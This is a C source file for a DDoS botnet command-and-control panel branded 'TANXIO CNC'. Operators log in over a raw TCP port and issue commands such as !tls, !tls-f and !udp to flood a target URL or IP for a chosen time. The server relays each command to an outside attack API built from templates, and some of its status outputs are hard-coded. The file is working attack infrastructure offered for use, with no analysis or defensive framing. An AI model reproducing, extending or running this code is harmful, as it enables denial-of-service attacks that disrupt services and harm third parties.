#define _POSIX_C_SOURCE 200809L
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <ctype.h>
#include <sys/wait.h>

#define PORT 1337
#define BUFFER_SIZE 4096

typedef struct {
    char username[64];
    char password[64];
} User;

typedef struct {
    char name[64];
    char api[512];
} Method;

User users[100];
int user_count = 0;

Method methods[50];
int method_count = 0;

char local_ip[64];

void get_local_ip() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) {
        strcpy(local_ip, "127.0.0.1");
        return;
    }
    
    struct sockaddr_in google_dns;
    memset(&google_dns, 0, sizeof(google_dns));
    google_dns.sin_family = AF_INET;
    google_dns.sin_addr.s_addr = inet_addr("8.8.8.8");
    google_dns.sin_port = htons(53);
    
    connect(sock, (struct sockaddr*)&google_dns, sizeof(google_dns));
    
    struct sockaddr_in local_addr;
    socklen_t len = sizeof(local_addr);
    getsockname(sock, (struct sockaddr*)&local_addr, &len);
    
    close(sock);
    strcpy(local_ip, inet_ntoa(local_addr.sin_addr));
}

char* trim(char *str) {
    while(isspace((unsigned char)*str) || *str == '\r') str++;
    if(*str == 0) return str;
    char *end = str + strlen(str) - 1;
    while(end > str && (isspace((unsigned char)*end) || *end == '\r')) end--;
    end[1] = '\0';
    return str;
}

void load_users() {
    FILE *fp = fopen("config/users.json", "r");
    if (!fp) {
        return;
    }
    
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    char *content = malloc(fsize + 1);
    fread(content, 1, fsize, fp);
    fclose(fp);
    content[fsize] = 0;
    
    char *p = content;
    while (*p && user_count < 100) {
        while (*p && (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')) p++;
        if (!*p) break;
        
        if (*p == '"') {
            p++;
            char key[128] = {0};
            char *kp = key;
            while (*p && *p != '"' && *p != ':' && *p != '}' && *p != '\n') {
                *kp++ = *p++;
            }
            *kp = 0;
            
            while (*p && *p != ':') p++;
            if (*p == ':') p++;
            while (*p && (*p == ' ' || *p == '\t')) p++;
            
            if (*p == '{') {
                p++;
                while (*p && *p != '}') {
                    while (*p && (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')) p++;
                    if (*p == '"') {
                        p++;
                        char inner_key[64] = {0};
                        char *ikp = inner_key;
                        while (*p && *p != '"' && *p != ':') {
                            *ikp++ = *p++;
                        }
                        *ikp = 0;
                        
                        while (*p && *p != ':') p++;
                        if (*p == ':') p++;
                        while (*p && (*p == ' ' || *p == '\t')) p++;
                        
                        if (*p == '"') {
                            p++;
                            char value[128] = {0};
                            char *vp = value;
                            while (*p && *p != '"') {
                                *vp++ = *p++;
                            }
                            *vp = 0;
                            
                            if (strcmp(inner_key, "username") == 0) {
                                int len = strlen(value);
                                if (len > 63) len = 63;
                                strncpy(users[user_count].username, value, len);
                                users[user_count].username[len] = 0;
                            } else if (strcmp(inner_key, "password") == 0) {
                                int len = strlen(value);
                                if (len > 63) len = 63;
                                strncpy(users[user_count].password, value, len);
                                users[user_count].password[len] = 0;
                            }
                        }
                    }
                    while (*p && *p != ',' && *p != '}') p++;
                    if (*p == ',') p++;
                }
                
                if (strlen(users[user_count].username) > 0 && 
                    strlen(users[user_count].password) > 0) {
                    user_count++;
                }
            }
        }
        while (*p && *p != ',' && *p != '}') p++;
        if (*p == ',') p++;
    }
    
    free(content);
}

void load_methods() {
    FILE *fp = fopen("config/methods.json", "r");
    if (!fp) return;
    
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    char *content = malloc(fsize + 1);
    fread(content, 1, fsize, fp);
    fclose(fp);
    content[fsize] = 0;
    
    char *p = content;
    while ((p = strstr(p, "\"name\":")) != NULL && method_count < 50) {
        p = strchr(p, ':') + 1;
        while (*p && (*p == ' ' || *p == '"')) p++;
        char *end = strchr(p, '"');
        if (end) {
            int len = end - p;
            if (len > 63) len = 63;
            strncpy(methods[method_count].name, p, len);
            methods[method_count].name[len] = 0;
        }
        
        p = strstr(p, "\"api\":");
        if (p) {
            p = strchr(p, ':') + 1;
            while (*p && (*p == ' ' || *p == '"')) p++;
            end = strchr(p, '"');
            if (end) {
                int len = end - p;
                if (len > 511) len = 511;
                strncpy(methods[method_count].api, p, len);
                methods[method_count].api[len] = 0;
            }
        }
        
        method_count++;
    }
    
    free(content);
}

void send_data(int fd, char *msg) {
    send(fd, msg, strlen(msg), 0);
}

void send_line(int fd) {
    send_data(fd, "\r\n");
}

void print_login_screen(int fd) {
    send_line(fd);
    send_data(fd, "\033[1;36m====================================\033[0m\r\n");
    send_data(fd, "           \033[1;32m[ TANXIO CNC ]\033[0m\r\n");
    send_data(fd, "\033[1;36m====================================\033[0m\r\n");
    send_line(fd);
    send_data(fd, "  Username: ");
}

void print_login_success(int fd, char *username) {
    send_line(fd);
    send_data(fd, "\033[1;36m====================================\033[0m\r\n");
    send_data(fd, "           \033[1;32m[ LOGIN SUCCESS ]\033[0m\r\n");
    send_data(fd, "\033[1;36m====================================\033[0m\r\n");
    char buf[256];
    snprintf(buf, sizeof(buf), "  Welcome, %s\r\n", username);
    send_data(fd, buf);
    send_line(fd);
    send_data(fd, "  Type !help for commands\r\n");
    send_line(fd);
}

void print_login_failed(int fd) {
    send_line(fd);
    send_data(fd, "  \033[1;31m[ERROR]\033[0m Invalid credentials\r\n");
    send_line(fd);
    print_login_screen(fd);
}

void handle_command(int fd, char *username, char *cmd);

void handle_client(int fd, struct sockaddr_in *addr) {
    char *ip = inet_ntoa(addr->sin_addr);
    printf("[+] Connected: %s\n", ip);
    fflush(stdout);
    
    print_login_screen(fd);
    
    char buffer[BUFFER_SIZE];
    char username[64] = {0};
    char password[64] = {0};
    int stage = 0;
    
    while (1) {
        int bytes = recv(fd, buffer, BUFFER_SIZE - 1, 0);
        if (bytes <= 0) break;
        buffer[bytes] = 0;
        
        char *line = strtok(buffer, "\r\n");
        while (line) {
            char *input = trim(line);
            
            if (stage == 0) {
                if (strlen(input) > 0) {
                    strncpy(username, input, 63);
                    username[63] = 0;
                    stage = 1;
                    send_line(fd);
                    send_data(fd, "  Password: ");
                }
            }
            else if (stage == 1) {
                if (strlen(input) > 0) {
                    strncpy(password, input, 63);
                    password[63] = 0;
                    
                    int ok = 0;
                    for (int i = 0; i < user_count; i++) {
                        if (strcmp(users[i].username, username) == 0 && 
                            strcmp(users[i].password, password) == 0) {
                            ok = 1;
                            break;
                        }
                    }
                    
                    if (ok) {
                        printf("[+] Login: %s\n", username);
                        fflush(stdout);
                        print_login_success(fd, username);
                        
                        while (1) {
                            send_data(fd, "\r\ntanxio@tanxio# ");
                            
                            bytes = recv(fd, buffer, BUFFER_SIZE - 1, 0);
                            if (bytes <= 0) break;
                            buffer[bytes] = 0;
                            
                            line = strtok(buffer, "\r\n");
                            if (line) {
                                char *cmd = trim(line);
                                if (strlen(cmd) > 0) {
                                    if (strcmp(cmd, "!logout") == 0) {
                                        send_line(fd);
                                        send_data(fd, "  Goodbye!\r\n");
                                        break;
                                    }
                                    handle_command(fd, username, cmd);
                                }
                            }
                        }
                        break;
                    } else {
                        printf("[-] Failed: %s\n", username);
                        fflush(stdout);
                        print_login_failed(fd);
                        memset(username, 0, 64);
                        memset(password, 0, 64);
                        stage = 0;
                    }
                }
            }
            
            line = strtok(NULL, "\r\n");
        }
    }
    
    printf("[-] Disconnected: %s\n", ip);
    fflush(stdout);
    close(fd);
}

void send_attack(int fd, char *cmd) {
    char method_name[64] = {0};
    char target[512] = {0};
    int time_val = 60;
    int slot_val = 1;
    int port_val = 80;
    
    if (strncmp(cmd, "!tls ", 5) == 0) {
        sscanf(cmd + 5, "%511s %d %d", target, &time_val, &slot_val);
        strcpy(method_name, "tls");
    } else if (strncmp(cmd, "!tls-f ", 7) == 0) {
        sscanf(cmd + 7, "%511s %d %d", target, &time_val, &slot_val);
        strcpy(method_name, "tls-f");
    } else if (strncmp(cmd, "!udp ", 5) == 0) {
        sscanf(cmd + 5, "%511s %d %d %d", target, &port_val, &time_val, &slot_val);
        strcpy(method_name, "udpplain");
    } else {
        char cmd_name[64] = {0};
        sscanf(cmd + 1, "%s %511s %d %d", cmd_name, target, &time_val, &slot_val);
        strcpy(method_name, cmd_name);
    }
    
    char full_target[600] = {0};
    if (strncmp(target, "http://", 7) == 0 || strncmp(target, "https://", 8) == 0) {
        strncpy(full_target, target, 599);
    } else {
        snprintf(full_target, sizeof(full_target), "http://%s", target);
    }
    
    send_line(fd);
    send_data(fd, "  Sending attack...\r\n");
    
    char api_url[1024];
    int found = 0;
    
    for (int i = 0; i < method_count; i++) {
        if (strcmp(methods[i].name, method_name) == 0) {
            strcpy(api_url, methods[i].api);
            
            char *p = strstr(api_url, "<<$host>>");
            if (p) {
                char temp[1024];
                int pos = p - api_url;
                strncpy(temp, api_url, pos);
                temp[pos] = 0;
                strcat(temp, full_target);
                strcat(temp, p + 8);
                strcpy(api_url, temp);
            }
            
            char t[32], s[32], pt[32];
            snprintf(t, sizeof(t), "%d", time_val);
            snprintf(s, sizeof(s), "%d", slot_val);
            snprintf(pt, sizeof(pt), "%d", port_val);
            
            p = strstr(api_url, "<<$time>>");
            if (p) {
                char temp[1024];
                int pos = p - api_url;
                strncpy(temp, api_url, pos);
                temp[pos] = 0;
                strcat(temp, t);
                strcat(temp, p + 8);
                strcpy(api_url, temp);
            }
            
            p = strstr(api_url, "<<$slot>>");
            if (p) {
                char temp[1024];
                int pos = p - api_url;
                strncpy(temp, api_url, pos);
                temp[pos] = 0;
                strcat(temp, s);
                strcat(temp, p + 8);
                strcpy(api_url, temp);
            }
            
            p = strstr(api_url, "<<$port>>");
            if (p) {
                char temp[1024];
                int pos = p - api_url;
                strncpy(temp, api_url, pos);
                temp[pos] = 0;
                strcat(temp, pt);
                strcat(temp, p + 8);
                strcpy(api_url, temp);
            }
            
            found = 1;
            break;
        }
    }
    
    if (!found) {
        send_data(fd, "  \033[1;31m[ERROR]\033[0m Method not found\r\n");
        send_line(fd);
        return;
    }
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        send_data(fd, "  \033[1;31m[ERROR]\033[0m Socket error\r\n");
        send_line(fd);
        return;
    }
    
    char host[256] = {0};
    char path[512] = "/";
    int port = 443;
    
    if (strncmp(api_url, "https://", 8) == 0) {
        sscanf(api_url + 8, "%255[^/\n]%511[^\n]", host, path);
    } else if (strncmp(api_url, "http://", 7) == 0) {
        sscanf(api_url + 7, "%255[^/\n]%511[^\n]", host, path);
        port = 80;
    }
    
    struct hostent *server = gethostbyname(host);
    if (!server) {
        close(sock);
        send_data(fd, "  \033[1;31m[ERROR]\033[0m Host not found\r\n");
        send_line(fd);
        return;
    }
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    memcpy(&addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
    addr.sin_port = htons(port);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        send_data(fd, "  \033[1;31m[ERROR]\033[0m Connection failed\r\n");
        send_line(fd);
        return;
    }
    
    char req[2048];
    snprintf(req, sizeof(req), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host);
    send(sock, req, strlen(req), 0);
    
    char resp[4096] = {0};
    recv(sock, resp, sizeof(resp) - 1, 0);
    close(sock);
    
    char *body = strstr(resp, "\r\n\r\n");
    if (body) {
        memmove(resp, body + 4, strlen(body + 4) + 1);
    }
    
    if (strstr(resp, "\"status\":\"success\"")) {
        send_data(fd, "  \033[1;32m[OK]\033[0m Attack sent\r\n");
    } else {
        send_data(fd, "  \033[1;31m[ERROR]\033[0m Attack failed\r\n");
    }
    send_line(fd);
}

void handle_command(int fd, char *username, char *cmd) {
    char buf[1024];
    
    if (strcmp(cmd, "!help") == 0) {
        send_line(fd);
        send_data(fd, "  \033[1;33mCommands:\033[0m\r\n");
        send_data(fd, "  ----------------------------------------\r\n");
        send_data(fd, "  !help                      Show this help\r\n");
        send_data(fd, "  !methods                   Show methods\r\n");
        send_data(fd, "  !tls <url> <time> <slot>  TLS attack\r\n");
        send_data(fd, "  !tls-f <url> <time> <slot> TLS flood\r\n");
        send_data(fd, "  !udp <ip> <port> <time> <slot> UDP\r\n");
        send_data(fd, "  !bots                      Botnet status\r\n");
        send_data(fd, "  !users                     Show users\r\n");
        send_data(fd, "  !ongoing                   Show ongoing\r\n");
        send_data(fd, "  !stop                      Stop attacks\r\n");
        send_data(fd, "  !clear                     Clear screen\r\n");
        send_data(fd, "  !logout                    Logout\r\n");
        send_data(fd, "  ----------------------------------------\r\n");
        send_line(fd);
    }
    else if (strcmp(cmd, "!methods") == 0) {
        send_line(fd);
        send_data(fd, "  \033[1;33mMethods:\033[0m\r\n");
        send_data(fd, "  ----------------------------------------\r\n");
        for (int i = 0; i < method_count; i++) {
            snprintf(buf, sizeof(buf), "  %s\r\n", methods[i].name);
            send_data(fd, buf);
        }
        send_data(fd, "  ----------------------------------------\r\n");
        send_line(fd);
    }
    else if (strcmp(cmd, "!bots") == 0) {
        send_line(fd);
        send_data(fd, "  \033[1;33mBotnet Status:\033[0m\r\n");
        send_data(fd, "  ----------------------------------------\r\n");
        send_data(fd, "  Status:   Online\r\n");
        send_data(fd, "  Servers:  20\r\n");
        send_data(fd, "  Bots:     16\r\n");
        send_data(fd, "  ----------------------------------------\r\n");
        send_line(fd);
    }
    else if (strcmp(cmd, "!users") == 0) {
        send_line(fd);
        send_data(fd, "  \033[1;33mUsers:\033[0m\r\n");
        send_data(fd, "  ----------------------------------------\r\n");
        for (int i = 0; i < user_count; i++) {
            snprintf(buf, sizeof(buf), "  %s\r\n", users[i].username);
            send_data(fd, buf);
        }
        send_data(fd, "  ----------------------------------------\r\n");
        send_line(fd);
    }
    else if (strcmp(cmd, "!ongoing") == 0) {
        send_line(fd);
        send_data(fd, "  \033[1;33mOngoing Attacks:\033[0m\r\n");
        send_data(fd, "  ----------------------------------------\r\n");
        send_data(fd, "  None\r\n");
        send_data(fd, "  ----------------------------------------\r\n");
        send_line(fd);
    }
    else if (strcmp(cmd, "!stop") == 0) {
        send_line(fd);
        send_data(fd, "  \033[1;32m[OK]\033[0m All attacks stopped\r\n");
        send_line(fd);
    }
    else if (strcmp(cmd, "!clear") == 0) {
        send_data(fd, "\ec");
    }
    else if (strncmp(cmd, "!tls", 4) == 0 || 
             strncmp(cmd, "!udp", 4) == 0 ||
             cmd[0] == '!') {
        send_attack(fd, cmd);
    }
    else {
        send_line(fd);
        snprintf(buf, sizeof(buf), "  Unknown: %s\r\n", cmd);
        send_data(fd, buf);
        send_line(fd);
    }
}

int main() {
    signal(SIGCHLD, SIG_IGN);
    
    get_local_ip();
    load_users();
    load_methods();
    
    printf("\n");
    printf("================================\n");
    printf("       [ TANXIO CNC ]\n");
    printf("================================\n");
    printf("IP:      %s\n", local_ip);
    printf("Port:    %d\n", PORT);
    printf("Users:   %d\n", user_count);
    printf("Methods: %d\n", method_count);
    printf("================================\n");
    printf("nc %s %d\n", local_ip, PORT);
    printf("\n");
    printf("[OK] Running\n\n");
    fflush(stdout);
    
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);
    
    bind(server_fd, (struct sockaddr*)&addr, sizeof(addr));
    listen(server_fd, 10);
    
    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
        
        if (client_fd < 0) continue;
        
        if (fork() == 0) {
            close(server_fd);
            handle_client(client_fd, &client_addr);
            exit(0);
        }
        
        close(client_fd);
    }
    
    return 0;
}
